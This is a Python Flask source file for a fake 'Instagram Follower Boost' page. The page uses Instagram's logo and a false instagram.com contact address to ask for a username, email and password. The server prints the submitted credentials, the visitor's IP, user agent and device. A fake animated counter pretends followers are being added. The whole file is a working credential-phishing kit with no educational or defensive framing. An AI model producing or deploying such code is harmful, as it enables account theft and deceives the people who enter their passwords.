from flask import Flask, request, render_template_string
import random

app = Flask(__name__)

# HTML template
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Follower Boost</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            margin: 0;
            padding: 20px 0;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
        }
        input {
            display: block;
            width: calc(100% - 22px);
            margin: 10px auto;
            padding: 10px;
            font-size: 1em;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        button {
            padding: 15px;
            font-size: 1.2em;
            color: #fff;
            background: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .counter {
            display: none;
            margin-top: 20px;
        }
        .counter.active {
            display: block;
        }
        .counter p {
            font-size: 1.5em;
            color: #333;
        }
        .error {
            color: red;
            font-size: 1em;
            margin-top: 10px;
        }
        .contact {
            margin-top: 30px;
            font-size: 0.9em;
            color: #555;
        }
        .contact a {
            color: #007bff;
            text-decoration: none;
        }
        .contact a:hover {
            text-decoration: underline;
        }
    </style>
    <script>
        let interval;
        
        function startCounter(targetNumber) {
            let currentNumber = 0;
            const counterElement = document.getElementById('count');
            
            // Clear any existing interval
            if (interval) clearInterval(interval);
            
            interval = setInterval(() => {
                if (currentNumber >= targetNumber) {
                    currentNumber = targetNumber;
                    clearInterval(interval);
                } else {
                    currentNumber += 10;
                }
                counterElement.textContent = currentNumber;
            }, 5000);
        }

        function showCounter() {
            const username = document.querySelector('input[name="username"]').value.trim();
            const email = document.querySelector('input[name="email"]').value.trim();
            const password = document.querySelector('input[name="password"]').value.trim();
            const numberOfFollowers = parseInt(document.querySelector('input[name="followers"]').value, 10);
            const errorElement = document.getElementById('error-message');
            
            // Clear previous error message
            errorElement.textContent = '';
            
            // Validate inputs
            if (username === '' || email === '' || password === '') {
                errorElement.textContent = 'All fields are required.';
                return;
            }
            if (!Number.isInteger(numberOfFollowers) || numberOfFollowers <= 0) {
                errorElement.textContent = 'Please enter a valid number of followers greater than zero.';
                return;
            }
            document.querySelector('.counter').classList.add('active');
            startCounter(numberOfFollowers);
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <h1>Boost Instagram Followers</h1>
        <form action="/submit" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="number" name="followers" placeholder="Number of Followers Desired" required>
            <button type="submit">Submit</button>
            <div id="error-message" class="error"></div>
        </form>
        <div class="counter">
            <p>Increasing followers... <span id="count">0</span></p>
        </div>
    </div>
    <div class="contact">
        <p>For complaints, contact us at: <a href="mailto:contact@instagram.com">contact@instagram.com</a></p>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    email = request.form.get('email')
    password = request.form.get('password')
    followers = request.form.get('followers')
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    user_device = request.user_agent.platform

    print(f"Username: {username}")
    print(f"Email: {email}")
    print(f"Password: {password}")
    print(f"Number of Followers: {followers}")
    print(f"User IP: {user_ip}")
    print(f"User Agent: {user_agent}")
    print(f"User Device: {user_device}")

    return '''
    <h1>Thank you for submitting the form!</h1>
    <p>We are processing your request.</p>
    '''

if __name__ == '__main__':
    port = random.randint(1024, 65535)  # Use a random port in the range of 1024 to 65535
    print(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port)
